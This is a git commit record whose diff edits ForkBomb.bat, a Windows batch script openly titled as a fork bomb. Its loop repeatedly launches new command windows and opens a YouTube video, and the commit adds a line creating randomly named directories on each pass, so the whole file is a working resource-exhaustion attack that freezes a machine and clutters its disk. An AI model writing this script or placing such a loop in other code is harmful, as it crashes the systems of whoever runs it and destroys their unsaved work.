62da9bb627abab9ca950195ced52053961032c19
hamzajaradatlol <47142963+hamzajaradatlol@users.noreply.github.com>
2019-11-29 17:58:53 +0200

    Changed the whole code and idea.

--- ForkBomb.bat
+++ ForkBomb.bat
@@ -2,7 +2,6 @@ echo FORK BOMB, CYKA!
 title go to hell
 :a
 start cmd
-start https://www.youtube.com/watch?v=lONuoIVrQN8
-start https://www.youtube.com/watch?v=eF40k0n_Qdk
-echo you just got pwned
+start https://www.youtube.com/watch?v=MuRWnnCA_WA
+md %random%
 goto :a
